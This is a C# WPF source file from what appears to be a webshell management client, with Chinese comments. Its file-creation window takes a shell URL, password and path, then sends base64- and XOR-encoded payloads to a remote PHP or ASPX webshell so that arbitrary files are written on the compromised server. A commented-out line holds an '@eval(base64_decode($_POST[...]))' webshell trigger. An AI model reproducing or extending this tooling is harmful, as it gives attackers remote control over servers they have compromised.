using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Forms;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using WpfApp1.Payload.aspx;
using WpfApp1.Payload.php;
using WpfApp1.Payload.php.xor;
using WpfApp1.Utli;

namespace WpfApp1.UI
{
    /// <summary>
    /// Createfile.xaml 的交互逻辑
    /// </summary>
    public partial class Createfile : Window
    {
        /// <summary>
        /// 引入payload
        /// </summary>
        Controller payload = new Controller();
        Base Base = new Base();
        FileOut filePayload = new FileOut();
        /// <summary>
        /// base64加密
        /// </summary>
        encrypt encrypt = new encrypt();

        /// <summary>
        /// shell 链接
        /// </summary>
        public string getUrl { get; set; }
        /// <summary>
        /// shell 密码
        /// </summary>
        public string getPwd { get; set; }
        /// <summary>
        /// 文件目录
        /// </summary>
        public string getPath { get; set; }

        /// <summary>
        /// 脚本类型
        /// </summary>
        public string getScript { get; set; }

        public Createfile()
        {
            InitializeComponent();
        }
        /// <summary>
        /// 新建文件按钮 点击事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Button_Click(object sender, RoutedEventArgs e)
        {
            if(getScript == "php")
            {
                
                string path = getPath + "/" + TextBox1.Text;

                //string z1 = "@eval(base64_decode($_POST['z1']));";
                string BasePath = encrypt.EncodeBase64("utf-8", path);
                string content = encrypt.EncodeBase64("utf-8", TextEditor.Text);

                string pathroot = filePayload.WriteFile(BasePath, content);
                string xor_base64_encrypt = Utli.xor_base64.Encrypt(pathroot);
                string resp = Utli.XorPost.Post(getUrl, xor_base64_encrypt);
                string xor_base64_decrypt = Utli.xor_base64.Decrypt(resp);

                //string p = z1 + "&z1=" + payload.WriteFile() + "&file=" + BasePath + "&content=" + content;

                //string results = Post.Postring(getUrl, new Dictionary<string, string> { { getPwd, p } });

                if (xor_base64_decrypt == "1")
                {
                    System.Windows.MessageBox.Show("Success");
                }
                else
                {
                    System.Windows.MessageBox.Show("Failed");
                }
            }
            if (getScript == "aspx")
            {
                string path = getPath + TextBox1.Text;
                string z1 = Base.CreateFile();
                string BasePath = encrypt.EncodeBase64("utf-8", path);
                string content = encrypt.EncodeBase64("utf-8", TextEditor.Text);
                string p = z1 + "&path=AQ" + BasePath + "&content=AQ" + content;
                string results = Post.Postring(getUrl, new Dictionary<string, string> { { getPwd, p } });
                if (results == "1")
                {
                    System.Windows.MessageBox.Show("Success");
                }
                else
                {
                    System.Windows.MessageBox.Show("Failed");
                }

            }
        }
    }
}
